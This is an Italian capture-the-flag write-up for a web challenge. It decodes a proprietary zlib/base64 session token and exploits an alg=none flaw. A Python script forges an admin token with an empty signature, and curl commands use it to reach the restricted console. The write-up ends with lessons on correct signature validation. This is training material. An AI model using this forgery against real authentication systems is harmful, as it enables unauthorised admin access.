# Enterprise Access Gateway v2.1

**Competizione:** ITSCyberGame<br>
**Categoria:** Web<br>
**Servizio:** `sfide.itscybergame.it:<port_number>`

---

## Descrizione

> Un vecchio gateway di autenticazione aziendale è stato ripristinato per test di archiviazione interna. Il sistema utilizza token proprietari per gestire l'accesso ai moduli riservati e l'eventuale escalation di privilegi. Solo il personale autorizzato può accedere alla Console Riservata. Il gateway dichiara di effettuare una validazione sicura dei token prima di concedere privilegi elevati. Riuscirai ad accedere al modulo amministrativo?

---

## Soluzione

### 1. Ricognizione

Enumerando gli endpoint dell'applicazione si trovano tre percorsi rilevanti:

```
GET  /        → 200  (homepage)
GET  /login   → 200  (form autenticazione)
GET  /admin   → 403  (console riservata)
```

Il form `/login` accetta qualsiasi username tranne `admin`, che viene rifiutato con il messaggio `"This username is reserved"`. Dopo il login con un username qualsiasi (es. `user`), il server rilascia un cookie `sessiondata`:

```bash
curl -s -D - -X POST 'sfide.itscybergame.it:<port_number>/login' \
  -d 'username=user' | grep 'set-cookie'
```

```
set-cookie: sessiondata=eJxFirsKgDAQBP9la5EgKpg...
```

### 2. Analisi del token proprietario

Il valore del cookie non è un JWT standard ma un formato proprietario: **payload JSON compresso con zlib e codificato in base64 URL-safe**, seguito da una firma HMAC-SHA256.

```python
import base64, zlib, json

raw = "eJxFirsKgDAQBP9la5EgKpg..."
payload_b64 = raw.split('.')[0].replace('-','+').replace('_','/')
payload_b64 += '=' * (4 - len(payload_b64) % 4)
data = zlib.decompress(base64.b64decode(payload_b64))
print(json.loads(data))
```

Contenuto decodificato:

```json
{
  "meta": {"alg": "HS256", "build": "2004.09"},
  "data": {
    "sub": "user",
    "role": "user",
    "tier": "standard",
    "scope": ["panel"]
  }
}
```

Il campo `meta.alg` indica l'algoritmo di firma usato per la validazione.

### 3. Attacco `alg=none`

La vulnerabilità è classica: il server legge il campo `alg` direttamente dal token (controllato dall'attaccante) e lo usa per decidere come validare la firma. Impostando `"alg": "none"` e fornendo una firma vuota, il server salta completamente la verifica crittografica.

Si forgia un token con privilegi admin:

```python
import base64, zlib, json

payload = {
    "meta": {"alg": "none", "build": "2004.09"},
    "data": {
        "sub": "administrator",
        "role": "admin",
        "tier": "elevated",
        "scope": ["panel", "admin"]
    }
}

compressed = zlib.compress(json.dumps(payload, separators=(',',':')).encode())
encoded = base64.b64encode(compressed).decode()
encoded = encoded.replace('+', '-').replace('/', '_').rstrip('=')

# Firma vuota = solo il punto separatore finale
forged_token = encoded + "."
print(forged_token)
```

### 4. Accesso alla console riservata

```bash
curl -s -b "sessiondata=eJw1i0EKgDAMBP-yZ5EiXvQr...." \
  'sfide.itscybergame.it:<port_number>/admin'
```

Il server accetta il token senza firma, riconosce `role: admin` e mostra la Console Riservata con la flag.

---

## Flag

```
flag{...}
```

---

## Conclusioni

La challenge illustra l'attacco **`alg=none`**, una delle vulnerabilità più note sui sistemi JWT e token analoghi. Il problema nasce dalla scelta di includere l'algoritmo di firma **nel payload stesso**, controllato dall'utente, invece di hardcodarlo lato server. Un'implementazione corretta deve:

1. **Ignorare** il campo `alg` presente nel token e usare sempre l'algoritmo configurato lato server.
2. **Rifiutare** esplicitamente `alg=none` o qualsiasi algoritmo non atteso.
3. **Non fidarsi mai** di metadati di sicurezza presenti nel dato che si sta validando.

Il titolo "v2.1" e il riferimento a "Build 2004.09" richiamano l'era pre-standard dei sistemi di autenticazione proprietari, in cui queste scelte di design erano comuni e raramente analizzate criticamente.